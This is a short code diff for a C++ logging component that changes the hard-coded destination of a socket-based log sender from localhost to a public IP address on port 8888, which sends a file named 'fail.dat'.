@@ -2,7 +2,7 @@
 #include "LogSender.h"
 
 std::string g_username="";
-std::string _ip = "127.0.0.1";
+std::string _ip = "139.129.94.128";
 short _port = 8888;
 SocketSender socketSender("./fail.dat",_port,_ip);
 
